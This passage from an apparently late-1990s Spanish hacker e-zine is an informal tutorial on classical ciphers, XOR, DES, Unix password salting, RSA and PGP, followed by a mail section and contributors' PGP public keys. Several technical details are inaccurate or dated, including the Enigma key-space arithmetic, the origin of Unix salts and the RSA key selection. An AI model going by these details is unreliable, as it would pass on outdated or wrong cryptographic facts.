linux sabran que eso es un error muy comun entre los que usa Windows. Por
otra parte, me niego a exponer todas las razones por las que alguien podria
querer que nadie mas que el destinatario pueda leer lo que le transmite, cada
uno sabra por que lo hace. Yo me limito a explicar los medios que tiene
(ademas que es mas comodo que copiar el archivo de ayuda del pgp, que viene
muy bien explicado :)

Teniendo en cuenta la historia de nuestra civilizacion, existen basicamente
dos formas de criptografia: las que se basan en usar diferentes combinaciones
sobre el abecedario para cifrar mensajes y, gracias a los ordenadores y a la
electronica, las que primero pasan ese mensaje a base binaria, y a traves
de matematicas muy complicadas, consiguen que sea casi imposible sacar el 
mensaje original del cifrado sin conocer la clave.

Obviamente la que nos interesa es esta ultima, pero explicare un poco por 
encima como funcionan las otras.

La historia de la criptografia moderna empieza durante la Segunda Guerra 
Mundial, cuando los oficiales de la armada alemana utilizaban unas maquinas 
llamadas Enigma para descifrar los mensajes que le llegaban cifrados por
radio, y la historia del criptoanalisis moderno empieza cuando un grupo del
servicio secreto britanico se da cuenta del pastel y empieza a reclutar a
matematicos para intentar encontrar un metodo para descifrar esos mensajes que
captaban sin tener que tener las claves que los alemanes cambiaban cada poco
tiempo. Basicamente, el Enigma es una maquina de escribir con un panel encima
donde hay letras que se iluminan, y cuatro ruedas dentadas de forma parecida a
las de reloj que van girando al mismo tiempo pero a distinta velocidad.
El concepto es que con una clave predefinida (una posicion inicial de las
ruedas) se iba escribiendo el mensaje cifrado y se iluminaban las letras 
correspondientes al mensaje sin cifrar.

Aunque en principio parezca un buen metodo (y no hay que dudar de que es 
ingenioso, cuando menos) y que a los ingleses les costo algo mas de tres a~os
en descifrar el metodo utilizado por el Enigma trabajando 24 horas al dia,
creo que queda bastante claro para todo el mundo que un sistema criptografico
asi no duraria mucho hoy en dia (vamos, que si un Celeron llega a los 900
MIPS, y teniendo en cuenta el numero de combinaciones posibles (4 ruedas ^ 28
letras= 7.2e16 posiciones diferentes), llegamos a la conclusion que no
tardariamos ni 20 segundos en acabar con las posibilidades, y eso tirando por
lo alto :)

A partir de este momento es cuando entra en juego la criptografia basada en 
las matematicas computacionales, de la que con ocuparemos a partir de ahora.

1.- Los tipos mas basicos de criptografia.
==========================================

	1.1- Sistemas basados en el offset.
	-----------------------------------
Aunque propiamente este sistema no dependa mucho de los ordenadores, lo 
comentare por que todavia se utiliza muchisimo en la industria del software
(el sistema que usa mi Windows 95 para guardar el password de los diferentes 
usuarios es de este tipo, aunque creo que las versiones a partir de la OSR2
se han 'adecentado' un poco).

Pensemos el abecedario:

ABCDEFGHIJKLMOPQRSTUVWXYZ

y ahora imaginemos que tenemos el mensaje 'EH CHICOS' que queremos cifrar.
Existen dos formas basadas en el offset (una traduccion bastante libre
del ingles podria ser 'distancia' :-):

    a) Podriamos coger para cada letra del abecedario, otra que la sustituyera
       siempre, del estilo f(x)=x+5 (donde x es la letra original y f(x) el 
       resultado cifrado). El abecedario se veria asi:

       ABCDEFGHIJKLMNOPQRSTUVWXYZ  ----->   EFGHIJKLMNOPQRSTUVWXYZABCD
        
       y nuestro mensaje cifrado

       E -> I
       H -> L
       
       C -> G
       H -> L
       I -> M
       C -> G
       O -> S
       S -> W  

       con lo que solo tendremos que enviar IL GLMGSW y saber la formula 
       necesaria para volver a leer el mensaje original. Como comprendereis,
       este metodo se conoce desde la epoca de los romanos (incluso antes)
       y no es lo que se dice muy seguro (por decirlo de una forma 'suave' ;)

       b) En vez de sustituir cada letra por otra que venga determinada por
       una formula fija, podriamos utilizar una que vaya cambiando para cada
       letra. Esto en teoria esta muy bien, pero imaginad intentar programar
       algo que contenga todas las formulas para encriptar todas las
       letras de un texto de, digamos, 100k: es monstruoso. La forma practica
       que se ha buscado es relacionar el cambio de la formula con la posicion
       de la letra en el fichero (o en la palabra, depende del programa), es 
       decir, con la distancia (offset) de la letra hasta el inicio.
       No se si esto me ha quedado muy claro, pero mejor lo explico con
       nuestro mensaje de ejemplo:

       Vamos a utilizar la formula f(x)=x+n , donde n es la posicion de la 
       letra con respecto del inicio del mensaje

       EH CHICOS
       12 345678   ->	n

       si volvemos a tener en cuenta el abecedario

       ABCDEFGHIJKLMNOPQRSTUVWXYZ

       con esta nueva formula resulta que:
       
       original         n       salida

       E	+	1   =   F
       H	+	2   =   J
       
       C	+	3   =   F
       H	+	4   =   L
       ...

       y el mensaje cifrado seria 'FJ FLNIVA'.
       En este simple mensaje vemos las ventajas de este sistema con respecto
       al anterior: una misma letra da distintos resultados segun su posicion,
       e iguales resultados pueden tener como origen letras muy diferentes.
       En resumen, es 'dificil' sacar el mensaje original sin la formula.


       1.2- Los sistemas de clave privada.
       -----------------------------------
En este tipo de criptografia solo explicare el metodo basado en XOR's, que es
el que mas simple y con el que quedara la cosa mas clara.

Primero una clase teorica sobre procesadores ;)

Todos sabeis que el ordenador, antes de usar la informacio, la pasa a base
binaria ya que es la unica que entiende (los famosos 0 y 1), y a partir
de ahi trabaja con ellos. Un byte tiene ocho bits, del tipo de 

   10110010

y si os habeis fijado, el numero maximo de combinaciones que se pueden hacer
con estos numero es 256 (2^8=256), que es precisamente el numero de caracteres
que tiene el codigo ASCII. La razon para esto es que el procesador trabaja
con los bits de ocho en ocho, o sea, que va guardando los 0 y 1 en unos 
registros donde caben ocho, y cuando los tiene lleno los procesa y los manda
a la salida (en realidad esto pasaba en los viejos ordenadores 8086, ahora
los procesadores son muchisimo mas potentes y hacen mas cosas a la vez, pero
la base es la misma).
Pues bien, aparte de las tipicas operaciones como sumar, restar, etc, existe
otro tipo de relaciones entre bits: las operaciones logicas.
Las operaciones mas basicas son AND, OR y XOR (se que me estoy dejando un
monton, pero ahora no vienen al caso), y se utilizan para comparar bits
y sacar un resultado.

La operacion AND compara dos bits y devuelve 1 si los dos bits son 1, en 
cualquier otro caso da 0:

	     11010101
        AND  10010110
       ----------------
	     10010100

OR (tambien llamado OR Inclusivo) devuelve uno si al menos uno de los dos
bits es 1:

	     10101011
	OR   10011011
       ----------------
             10111011

Sin embargo, la que mas nos interesa es la relacion XOR (OR Exclusivo).
Esta devuelve 1 solo si uno de los dos bits es 1, y 0 en cualquier otro
caso. Asi:

	     10010110
	XOR  01011010
       -----------------
	     11001100

Puede que creais que esto no tiene ninguna utilidad, pero los mas avispados
ya os habreis dado cuenta de una cosa: si volvemos a hacer un XOR al resultado
con el byte que que habiamos usado antes, obtenemos el original. Veamoslo
con un ejemplo:

    - Tengo el byte 01100001 que corresponde al caracter 'a' (97 en ASCII).
    - Vamos a hacerle un XOR con la letra 'l' 01101100


              01100001
         XOR  01101100
        ----------------
              00001101     13 en ascii, el caracter de control del retorno
                           de carro --> (Enter, para que nos entendamos ;)

    - Si ahora cogemos el resultado y le volvemos a hacer un XOR con la
      letra 'l':


               00001101
         XOR   01101100
        -----------------
               01100001

      volvemos a obtener la letra 'a' original.

Pues en esto tan simple se basa la mayoria de los sistema de criptografia de
clave privada. Volviendo con nuestro querido mensaje:

        - utilizaremos la clave 'cafo':


               EH CHICOS    <-- tened en cuenta que el espacio tb es un 
         XOR   cafocafoc        caracter de ASCII y hay que cifrarlo.
        ------------------
               &)F,+(% 0

Aqui tenemos ya nuestro mensaje completamente 'indescifrable' ;) sin la clave.
A lo mejor a mas de uno se le haya ocurrido que este es el mecanismo perfecto
para encriptar cosas ya que con la clave adecuada se puede sacar cualquier
mensaje que pensemos, es decir, que si tengo el mensaje ya encriptado nada
me impediria hacerle un XOR con la clave

   72 108 31 12 102 105 104 97 16 (lo pongo en ASCII porque hay caracteres de
                                   control que no se ven bien con todos los
                                   editores)

y obtener asi el mensaje 'HEY MAMA ', que obviamente no tiene nada que ver
con nuestro querido 'EH CHICOS'. Pues bien, seamos serios. Vale que para una
simple frase (y teniendo en cuenta que hemos usado el XOR a pelo, o sea, que
no hemos hecho ninguna operacion matematica con los caracteres antes de
usarlos) este sistema sea bastante 'bueno', pero creedme si os digo
que no es muy dificil programar un ordenador para que vaya descartando
mensajes improbables, y si no, siempre estara el tecnico de turno para
ayudarle porque, claro, no es lo mismo un texto inteligible que un texto que
tiene sentido (que los humanos nos damos mucha ma~a para eso ;).

Poco mas que a~adir a este sistema. Simplemente que os olvideis de el :).
Es demasiado simple y ya solo se usa junto con los anteriores basados en
offset (para que la misma clave no encripte dos mensajes de la misma forma)
y algunos algoritmos que hacen cosas 'raras' con los bits antes de usarlos.
Uno de estos sistemas es el siguiente. Muy potente y dificil de crackear,
pero al que ya se le esta buscando sustituto.

        1.4- El estandar DES
        ---------------------

En este apartado intentare explicar en que se basa el DES, un sistema
criptografico muy avanzado de clave privada, para que veais hasta donde
se puede llegar con uno de estos sistemas.

Por si no lo sabeis este es el sistema que utilizan los Unix para cifrar las
claves de acceso ;).

El DES (Data Encription Standard) fue creado a mediado de los setenta por
IBM y es el estandar de cifrado utilizado gubernamentalmente por EEUU desde
1976.

Se puede decir que el interes que despierta el DES radica en que el ataque
mas efectivo contra el sistema es el de fuerza bruta, con la consiguiente
perdida de tiempo que genera. Ademas, cualquier ataque solo puede realizarse
sobre un texto en particular, por lo que no se pueden aprovechar los
resultados obtenidos en otro intento.

Tecnicamente el DES usa bloques de cifrado de 64 bits con claves de 56 bits.
Es un sistema de clave simetrica, lo que quiere decir que se usa la misma
clave para encriptar que para desencriptar. Basicamente el metodo consiste
en dos permutaciones de bits (una al principio y otra al final del proceso)
y 16 pasos intermedios. Expliquemos el proceso:

        1.- La clave se contiene mediante una serie de tecnicas en un numero
            de 64 bits, es decir, en un numero de 8 bytes de longitud.
        2.- Cada siete bits, el que ocupa la posicion octava es
            'despreciado' y con los restantes 56 bits se forman
            mediante cierto algoritmo 16 subclaves distintas de 48 bits
            cada una (una clave por cada paso intermedio).
        3.- Ahora el mensaje se separa en bloques de 64 bits cada uno.
        4.- Cada bloque es dividido en dos bloques de 32 bits que es
            posteriormente expandido (mediante tecnicas de 'descompresion') a
            48 bits.
        5.- Al primer semi-bloque se le hace un XOR con la clave de 48 bits
            correspondiente al primer paso y despues se la hace pasar por
            8 procesos de sustitucion de bits. Estos son procesos que, como
            su nombre indica, sustituyen cada bit del bloque por otro segun
            una tabla predefinida. Si alguien tiene interes en las tablas de
            los ocho procesos que las pida ;).
        6.- Despues de pasar por los ocho pasos, el semi-bloque vuelve a
            comprimirse a 32 bits y se le hace pasar por un proceso de
            permutacion que combina los bits entre si (por si la cosa no
            estaba lo suficientemente liada ;).
        7.- Al anterior semibloque se le hace un XOR con el semi-bloque
            que todavia no habiamos tocado, y se intercambia la posicion:
            el primer semi-bloque se convierte en el segundo y viceversa.
        8.- Volvemos a repetir todas las operaciones anteriores a partir
            del paso 5 con el segundo semi-bloque (que ahora se ha convertido
            en el primero).
        9.- Y ahora volvemos a hacer todo lo anterior con las 15
            subclaves que nos quedan ;)
        10.- Una vez que hallamos terminado con los 16 pasos intermedios
             y hallamos hecho la permutacion final, es hora de coger
             el segundo bloque de 64 bits de nuestro mensaje inicial y volver
             a repetir todos los pasos con el.

Pues en esto consiste el DES. Voy a intentar reproducir graficamente el
proceso para cada bloque de mensaje, siguiendo una imagen que he encontrado
por ahi:


        Llave de 64 bits                          Bloque de 64 bits
               |                                          |
               |                                          | 
               |                                          |
        Permutacion de la                            Permutacion 
             llave                                     Inicial
               |                                          |
               |                                          |
               |                                          |
        Llave de 56 bits                           Bloque de 64 bits
           /      \                                   /      \
         /          \                               /          \
   Parte izqda     Parte drcha                Parte izqda      Parte drcha
   de la llave     de la llave                del bloque       del bloque
     32 bits          32 bits                     \               /
      |                 |                           \           /
      |                 |                             \       /
      |                 |                               \   /
   Operaciones       Operaciones                          \
   con los bits      con los bits                       /   \
       \                /                             /       \
         \            /                             /           \
          Compresion y                            /               \
          permutacion                           /                   \
               |                PROCESO --------                     |
               |          / --- CON UN                               |
               |        /       SEMI-BLOQUE                          |
          Subllave de /                    \                         |
            48 bits                          \                       |
                                               \                     |
                                                 \                   |
                                              Nueva parte     Nueva parte
                                              izqda del       derecha del
                                              bloque          bloque
                                                              (=antigua parte
                                                                izqda)

Y los nuevos semi-bloques se vuelven a poner en lo alto de la cadena para
repetir todo el proceso.

Esto es el estandar (o 'como deberia usarse este sistema'). Sin embargo,
todos sabreis que los password de Unix no son reversibles, es decir, que
a partir de la clave cifrada no se puede sacar la clave original, como
resultaria lo logico tratandose de un sistema simetrico.

El caso es que en Unix se utiliza lo que se llama tecnica 'one-way', o camino
de una sola direccion: en los procesos de permutacion y sustitucionn de bits
se produce una perdida de datos, con lo que no se puede volver a extraer
la clave original. Lo que se hace para averiguar si la clave introducida
en el login es la correcta, es encriptar la clave que se ha metido y
compararla con la que el sistema guarda ya encriptada (el famoso /etc/passwd)
y si son iguales te permite la entrada.

Para a~adir una dificultad extra a los ataques de fuerza bruta, los
dise~adores del sistema de Unix idearon una tecnica muy curiosa. Se trataba
de hacer que un posible ataque se desviara hacia salidas falsas, por lo
que la perdida de tiempo era mayor. Lo que se hizo fue a~adir a cada
password unos bits adiccionales, 'salt bits' (granitos de sal, segun mi propia
y chapucera traduccion ;), basados en la fecha y la hora de la creacion
del password, y operar con la clave con ellos ya metidos. El resultado
es que por cada clave que cifremos con este sistema se pueden crear 4096
claves diferentes, dependiendo de la hora en la que actuemos.
Es por esta razon por la que las sesiones de cracking con el John the Ripper,
StartCracker, etc. tardan tanto: por cada clave que le introduzcamos o
genere tiene que probar 4096 combinaciones diferentes, encriptarlas, y
compararlas con las del archivo de claves.

Solo una cosa mas de este sistema.

Hay claves muy debiles que deben ser evitadas a toda costa, porque
si se usan, cualquier ataque decente las pillara enseguida.
Estas claves son en hexadecimal:

0000000 0000000
0000000 FFFFFFF
FFFFFFF 0000000
FFFFFFF FFFFFFF

y otras que dan la misma salida en la encriptacion:

01FE01FE01FE01FE y FE01FE01FE01FE01
1FE01FE00EF10EF1 y E01FE01FF10EF10E
01E001E001F101F1 y E001E001F101F101
1FFE1FFE0EFE0EFE y FE1FFE1FFE0EFE0E
011F011F010E010E y 1F011F010E010E01
E0FEE0FEF1FEF1FE y FEE0FEE0FEF1FEF1

Si a alguien le interesa, el resultado de encriptar nuestro 'EH CHICOS' con
la clave 'cafo' siguiendo el modelo estandar es (y en hexadecimal):

42 15 54 1E 74 AB BF 6B 7E 67 A5 47 46 7D F8 7A


2.- Los sistemas de Clave Publica. La evolucion logica.
=======================================================

En resumen del punto anterior se puede decir que la seguridad de los sistemas
de clave privada se basan en mantener en secreto la clave utilizada para
cifrar y, aun mas importante (por la cosa de dificultar los ataques de fuerza
bruta basados en el analisis del sistema), el algoritmo matematico utilizado
para el cifrado.

Pues bien. Supongamos que tenemos un sujeto que tiene un sistema basado
en clave privada del que solo el conoce la clave y la formula. Es evidente
que solo le seria util a el, puesto que para poder enviar mensajes a otra
persona usando ese sistema tambien necesitaria enviar la formula matematica
y la clave.

Ahora supongamos que este sujeto necesita comunicarse con otra persona y
decide usar este sistema de criptografico. Lo que tendria que hacer es mandar
por un canal seguro (supondremos que la via por la que piensa mandar el
mensaje cifrado puede ser espiado) el algoritmo y la clave y, en otro momento,
enviar el mensaje. Y aqui es donde radica la gran paradoja de los sistemas
de clave privada: si se dispone de un canal seguro para enviar los algoritmos
y la clave, por que no enviar todo el mensaje por ahi??? (seguro que todos
recordais la tipica pelicula de James Bond en la que sale un correo con
el maletin de las claves esposado a su brazo ;)

En este momento es donde salen a relucir los sistemas basados en clave
publica.

Este tipo de sistemas se idearon (segun algunas fuentes) a principios de los
setenta por el ejercito britanico, pero realmente fueron desarrollados
a mediados de dicha decada por Whitfield Diffie y Martin Hellman.
Sus premisas principales eran:

        a) Se usan dos claves diferentes: una publica para cifrar los mensajes
           y otra, privada, para descifrarlos.

        b) Obviamente, la clave publica debe ser conocida por el publico,
           es decir, que el que quiera encriptar algo debe conocer la
           clave publica, pero no necesariamente la privada.

        c) La seguridad del sistema no debe basarse en la ocultacion del
           algoritmo usado. Mas bien al contrario: el algoritmo se hace
           publico para que los criptoanalistas puedan comprobar su
           seguridad y se puedan ir corrigiendo los fallos.
           (este supuesto ya es conocido y usado desde los tiempos del
           DES, porque se dieron cuenta que un millon de cerebros piensan
           mas que dos)

        d) Debe ser computacionalmente imposible hallar la clave privada
           a partir de la publica (con esto quiero decir, no que no se pueda,
           sino que no merezca la pena intentar averiguarla, es decir, que
           el tiempo que se tarde en intentarlo sea un impedimento mayor que
           el beneficio que se obtendria al hacerlo. Si no recuerdo mal, este
           tiempo, uniendo la potencia de todos los pc's del mundo, oscila
           entre las 3 y 4 veces la edad del universo: un impedimento
           aceptable ;)


Vamos a explicar como funciona el RSA. Para ello tendremos que ver antes una
introduccion a las matematicas que usa.

Todos estos algoritmos se basan en ciertas relaciones matematicas descubiertas
por Fermat, Euclides, y demas gente de esa talla.

Concretamente, el algoritmo que usa el RSA original se basa en una relacion 
que descubrio Fermat en el siglo XVII: la diferencia entre dos numeros de la
forma

	a^x - a     ('a' elevado a 'x' menos 'a')

siempre es divisible por x, siempre que x sea un numero primo (si no os lo 
creeis ya podeis coger la calculadora y empezar a hacer pruebas ;). La 
variacion que encontraron es la siguiente: si 'm' y 'n' son dos numeros
primos y 'a' es un numero natural coprimo con los dos anteriores (los numeros
coprimos son aquellos cuyo maximo comun divisor es 1; por ejemplo, el 50
y el 7 son numeros coprimos) entonces la diferencia

	 a^(m-1)(n-1)  -  1

es divisible por el producto 'mn'.
La gracia consiste en encontrar un numero 'k' que sea el producto de 'm' y 'n'
de forma que sea lo mas dificil posible encontrar 'm' y 'n' a partir de 'k',
es decir, que sea muy dificil factorizar 'k' para sacar los numeros primos de
los que proviene. Esto se consigue gracias a que los metodos de factorizacion
pierden eficacia cuanto mas grandes sean los numeros primos elegidos (y en el 
RSA cogen numeros primos de mas de 100 cifras cada uno).

Ahora tomemos cada clave (la publica y la privada) como dos pares de numeros
de la forma (e,k) y (k,d) donde 'e' es la clave con la que se encripta y
'd' con la que se desencripta.

Convirtiendo el mensaje que queremos encriptar 't' en un numero natural mas 
peque~o que 'k-1' (si el mensaje es mas grande que eso, se corta por partes)
tenemos que las funciones para encriptar (E) y para desencriptar (D) son
definidas asi:

	E = t^e mod k == C    <-- C es el mensaje ya cifrado
	D = C^d mod k

(por si no sabeis lo que es operar con modulos la explicacion es muy facil:
son operaciones en las que el limite esta impuesto por el coeficiente del 
modulo, es decir, y explicado con un ejemplo, si nos movemos en modulo 7
los numeros nunca podran tener un valor por encima del siete, por lo que 
contando desde el principio seria 
 	
	1, 2, 3, 4, 5, 6, 7, 1, 2, 3, 4, 5, 6, 7, 1, 2, 3, ...

y asi hasta el infinito. Si el resultado de una operacion sale por encima 
del coeficiente del modulo, se le va restando dicho coeficiente hasta que
este dentro de los limites permitidos. Por ejemplo, si en mod 7 queremos
multiplicar 3 y 4, tenemos que

	3*4 = 12     <-- es mayor que el limite de 7, por lo tanto
	12 - 7 = 5

y el resultado es 5)

Volvamos con nuestras formulas de cifrado.

La clave de la seguridad del sistema radica en elegir bien 'e' y 'd' para
que la cosa no sea reversible, es decir, para que teniendo una no se pueda
sacar la otra.

'd' se escoge aleatoriamente como un numero natural coprimo con el producto
(m-1)(n-1).

'e' se toma como uno de los valores que resultan a aplicar el teorema 
de Euclides para sacar maximos divisores comunes entre 'd', (m-1) y (n-1).

Como hemos puesto la condicion de que 'd' sea coprimo con (m-1) y (n-1),
y teniendo en cuenta la dificultad de la factorizacion, resulta casi
imposible sacar 'd' a partir de 'e' y de 'k' (dicho en cristiano, que no
se puede sacar la clave de desencriptacion conociendo el producto de los
numeros primos y la clave de encriptacion. Si os habeis fijado, estos dos
valores son los que conforman la clave publica (e,k)), y tampoco al
contrario: no se puede sacar 'e' a traves de 'd' y 'k' (esto tiene utilidad
en el tema de las firmas digitales por la cosa de que se utiliza la
clave privada para firmar un documento).

Explicado esto el proceso es simple.
Cuando queremos encriptar un mensaje seguimos estos pasos:

	1.- Reduciomos nuestro mensaje al numero 't' de forma que sea 
	    mas peque~o que k-1
	2.- A este numero lo encriptamos usando el resto de la division
	    t^e / k y obtenemos el mensaje cifrado C
	3.- Mandamos este mensaje y el destinatario solo tiene que usar
	    para desencriptar el resto de la division C^d / k (recordad que
            'd' solo lo posee el due~o de la clave privada), porque, gracias
	    al teorema de Fermat, estamos seguros que volveremos a obtener
 	    el mismo mensaje.

Pues esto es todo.
Esta es la forma mas 'pura' de RSA que he encontrado.
Veamos ahora un caso particular de utilizacion de este algoritmo. 


	2.1- El PGP.
	-------------
Como os habreis fijado al generar un par de claves con el PGP, el programa
lo que hace es preguntaros un identificador, despues os pide que introduzcais
la clave y, depende de la plataforma, que escribais aleatoriamente, que movais
el raton, etc. Despues, y dependiendo del numero de bits que le habeis dicho
que utilice para generar la clave, tarda mas o menos en generar los dos
numeros primos. Que conste que para bits exponentes de 2 (1024, 2048, etc)
utiliza formulas super-rapidas para buscar estos primos, por lo que es casi
instantaneo (a mi, para generar mi clave de 4093 bits, me tardo 8 horas y
media en un pentium 166 ;).

El gran fallo que tiene el RSA es que es lento, lo que para un programa
comercial es un incordio.

La solucion que escogio Phil Zimmerman (el creador del programa) fue la 
siguiente:
	
	1.- Para encriptar un mensaje, primero generamos una clave aleatoria
	2.- Usando esa clave aleatoria encriptamos el mensaje con tecnicas
	    paracidas a las de DES (que son muy rapidas) y el resultado lo 
            guardamos en el archivo final.
	3.- Ahora (y aqui esta el truco) encriptamos la clave aleatoria con
	    todas las claves publicas de los destinatarios (asi podremos
	    enviar un mismo mensaje a distintos destinatarios), y las metemos
	    en el archivo junto con los identificadores de las claves publicas
	    usadas.

Lo que hay que hacer es mandar este archivo al destinatario y al
desencriptarlo lo que se hace es:

	1.- El programa mira si alguno identificadores coincide con los de 
	    las claves privadas que posee.
	2.- Si encuentra alguna, te pide la contrase~a de esa clave y, si es
	    correcta, empieza a desencriptar la clave aleatoria con tu clave
            privada.
	3.- En cuanto la tiene, lo unico que tiene que hacer es desencriptar
	    el resto del mensaje con la clave aleatoria que acaba de 
	    desencriptar.

Con este metodo, para lo unico que se usa RSA es para encriptar la clave 
aleatoria, con lo que la seguridad es 'casi' la misma, pero va mucho mas 
rapido. Graficamente, un archivo codificado con PGP tendria la siguiente
estructura:

	_________
	|_______|   <-- cabecera del mensaje (lo tipico de 'BEGIN PGP ...')
	|   1	|   <-- estos son los identificadores de los destinatarios
	|   2	|   <-- encriptados
	|_______|
	|___1'__|   <-- esto es la clave aleatoria encriptada para cada
	|___2'__|   <-- destinatario.
	|	|
	|	|   
	|	|   <-- este es el mensaje original encriptado con la clave
	|	|       aleatoria.
	|_______|
	

Esto es lo que hacia el PGP antiguo. Ahora la tendencia es usar los
algoritmos desarrollados por Diffie y Hellman para claves de mas de 2048
bits, aunque el problema que presentan todas estas nuevas teorias matematicas
(me refiero a la de las curvas elipticas y demas que ahora estan tan de moda)
es que, por ser tan nuevas, no existe la seguridad de que sean tan 
campletamente seguras, es decir, que a lo mejor ma~ana se presenta un 
matematico con una herramienta nueva y eficaz que es capaz de factorizar
las claves en un minuto, con lo que todo el trabajo se habria desperdiciado.
Es por esto que todos los criptoanalistas aconsejan que se sigan usando los
viejos sistemas (bueno, no los viejos de verdad, sino los mas nuevos que 
hayan demostrado ser muy dificiles de romper) en vez de irse como locos a
probar todos estos nuevos algoritmos si en lo que trabajamos es algo que 
necesita una gran dosis de seguridad.   



Pues poco mas me queda por decir. Mejor dicho, me queda mucho por decir
pero no creo que en este articulo introductorio quepan muchas cosas :).

Como no podria ser de otra forma terminare mi articulo con mi clave
PGP. Asi, si quereis comentar algo sobre el mismo, tendremos la 'seguridad' 
de que nadie nos esta espiando X-D.


Para cualquier cosa que gusteis

encmesiah@bigfoot.com

un saludete.
cafo


==============================================================================
------------------------------------------------------------------------------
==============================================================================


 + CORREO FRESCO


     Bueno, en este primer numero esta seccion no es que sea muy larga que
digamos :). Me imagino que ya sabreis de que ira esta seccion, si no, os lo
explico. Esta es la tipica seccion donde los lectores del e-zine escriben
explicando sus dudas sobre algo y nosotros intentamos responderlas. Asi de
simple ;). Ademas, en esta seccion se pueden enviar mails donde se explique
algo que quereis que sepan todos los lectores, como pueden ser quejas,
algun comentario o saludos. Tambien se puede utilizar esto como un, digamos,
tablon de anuncios del tipo " ... se organiza una quedada de hackers
barceloneses el dia ... ;)" o similares. En resumen, esta es VUESTRA seccion.
Asi que, a que esperais para escribir ;) ?


==============================================================================
------------------------------------------------------------------------------
==============================================================================


 + LLAVES PGP


     Para los amantes de la privacidad y tambien para los que no, aqui van
las llaves PGP de los que han colaborado en este numero del e-zine. La llave
oficial de [ The NetSearch E-Zine ] se encuentra al principio del e-zine,
buscadla bien ;).

     Bueno, alla van:


 + LLAVE PGP DE ULANDRON


-----BEGIN PGP PUBLIC KEY BLOCK-----
Version: GnuPG v0.9.1 (GNU/Linux)
Comment: For info see http://www.gnupg.org

mQGiBDacgekRBACfpPhY+hhtthnfjkRVXG2Gl9S9rUoEajmQ+Lf+x2AyS9/xrtPl
1UeZjm6NzdMCo+kf1JxgFUfPn7m1zlScY7yy3X9nF0w6rHqtnXS0qc289rUVmELD
cJy/JmT4DlpBEmUPPk+ET+8rExpRO7xA6HoR4ZgVWQdGX3YeKmcyd2NGVwCgqIKb
kHUXSn6qd0rJuDO193CFP9cD/12xKESoTdSZMP3l8p0yA7/5szlCogGfBH1OjZAV
wrebAkJcYl2kcuKEP7Lu8QR5zkkCM4tPZO4xch8VxG/og17M9BsfvDk7drgO5MJy
klDbmRaFD5D+uzzKF/iz0afOXoGyfZnrRiKdabXBWjZ73wkwz+ev/1Vp+TOF+FTe
xcqGA/9DRKV+nbf2xb4QCvSnRQl4j/o7YyILNsSj7mU9xPBTjZLVSZ10foJyowfN
w+W3AyX0XSoS+wi25fPhBRKhIK1LQlxSV8Pm68/41z/aLRxcdpFatCQH0JgZQmwV
yoYREF9YfYSGMC3tTLcxpiHO5XzRM9DTMjRRj9v/wpb60dPMKbQeVWxhbmRyb24g
PHVsYW5kcm9uQHBzeW5ldC5uZXQ+iFcEExECABcFAjacgekDCwQDBRUDAgYBAxYC
AQIXgAAKCRA90kg8z0K2P9onAJ9Dj4VI8gjqZH/tUgWeULWdGAT1RgCfaYPTly0y
zy3ljOifL+1OkKcppeW5AQ0ENpyCAxAEAMofW7DR0WLQkizDm29RDq5EiCysnJ93
NEuFVoC/y0LFFBZ2JcN77O+cTrljMDk5TQUNAB7L8mlXlXPgH1Ne/j38jBkFublF
B/r7vr3OOa3KGX1pCWSkCiw3rNCMpvkO6PSjPg4ijA1agixfoddo0VeroBQu57KR
D7Ygl2kGpcvfAAMHBACbpXAI6qnF0BWw6MWNe1QXczpeiESRqPZvLEYz//u/BptQ
3wf8FKdQaiwaLhEZAiosCux47Qnx3zU/NGL/ujIdbciVOzQMubVM8U8Ao0ACDEnt
i1meqLNcenvJM/J+FN6HRp0R+EW3Chxb8Fz1+myugfHOxMw7aFh90m7avHnmXIhG
BBgRAgAGBQI2nIIDAAoJED3SSDzPQrY/6sYAnjA7aEJJDM5iXX8eLbX5wvoft0Gu
AKCeRZisFpJqDQHQlEwumEphVIgp0g==
=h0Tu
-----END PGP PUBLIC KEY BLOCK-----


 + LLAVE PGP DE DARK FEAR


-----BEGIN PGP PUBLIC KEY BLOCK-----
Version: PGPfreeware 6.0.2i
Comment: - God Must Die -

mQGiBDc56lARBADSN0mYy8nlBonQI/pigblLLY6wuoSgGe989NjJ7YuMW9tSRii3
ydafUsIMsWtWupZoXzbYpRs0jO0BYtoz8u5Hroc+NcxsBMkBzK7IFajBmgoAGcuM
xCKt70Fs8eK8hOvpgA7rnlzkmKqb8GQOX0bl+cUIwqE2xLiyT6hDRoH7bwCg/1FH
pw7ET8oE5A9g/3jieZYk820D+gK/sPos8+DjiifxY/YzGghPtJ2R9iTngFtVOgTI
QCDS8EiB5C/G5y/vcayJZtR0fctrq+A5f0DHslETHZRV58ts4FnllIdxwj8SN9gj
DnXRVMoZVxfcwTKgxd+DB7rRfUyXFDBe1d7UGK1B5Vcqb8lm4Y5BfXt8nzjYBxwy
r5gnA/kBGhTjkfXaF0GlZkp8zMKkD5mb25Zgg+IZPXMuOpmENz6CeOTJt7Z9xZW2
YJF/olPTjjjInYMo6GmEEhNRF2KYzHJtYqK9Xwz7mKgXKNHnVFjg1UUCohS0sqLe
Tbz+Z2Cv2ArhbirFgd0DhZ31Cf1QJKFNqwwE5QosaCTLtreNuLQfRGFySyBGZWFS
IDxkYXJrZmVhckBob3Rwb3AuY29tPokASwQQEQIACwUCNznqUAQLAwIBAAoJEHk2
4cxafWw46kUAn3Gmv0Mfa5Y+doKEfEv73v7j0wddAKC3ipb+oddJ22n557OcQdKL
/S8bmLkCDQQ3OepQEAgA9kJXtwh/CBdyorrWqULzBej5UxE5T7bxbrlLOCDaAadW
oxTpj0BV89AHxstDqZSt90xkhkn4DIO9ZekX1KHTUPj1WV/cdlJPPT2N286Z4VeS
Wc39uK50T8X8dryDxUcwYc58yWb/Ffm7/ZFexwGq01uejaClcjrUGvC/RgBYK+X0
iP1YTknbzSC0neSRBzZrM2w4DUUdD3yIsxx8Wy2O9vPJI8BD8KVbGI2Ou1WMuF04
0zT9fBdXQ6MdGGzeMyEstSr/POGxKUAYEY18hKcKctaGxAMZyAcpesqVDNmWn6vQ
ClCbAkbTCD1mpF1Bn5x8vYlLIhkmuquiXsNV6TILOwACAgf/XmaCjG/JiKtAWfxy
Asc0IlMtV49Tnfn2Px+1w5aSsh6u1109K8g4EuYjU6m0I4FaNxe/VMm6k6+/IsoY
6SKuLDyNcHQITtdPH5LX4Ojjh7jFEq/ywZBRnMqAKLJONJQbk2LAWifzvB6HeS1a
9pz3yILbjNmQKmCbyIma3PnIBhI3phPG8cdWyIrsINH477Iom1hERiDHltfseBlp
